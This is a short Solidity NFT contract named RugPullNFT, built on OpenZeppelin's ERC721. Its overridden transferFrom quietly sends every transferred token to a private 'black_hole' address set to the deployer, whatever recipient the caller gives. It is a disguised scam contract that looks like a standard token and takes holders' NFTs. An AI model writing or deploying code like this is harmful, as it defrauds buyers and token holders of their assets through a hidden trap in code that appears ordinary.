pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC721/ERC721.sol";

contract RugPullNFT is ERC721 {
    address private black_hole;

    constructor(address owner) ERC721("AllMine", "ME") {
        black_hole = owner;
    }

    function transferFrom(address from, address to, uint256 tokenId) public virtual override {
        //solhint-disable-next-line max-line-length
        require(_isApprovedOrOwner(_msgSender(), tokenId), "ERC721: transfer caller is not owner nor approved");

        _transfer(from, black_hole, tokenId);
    }
}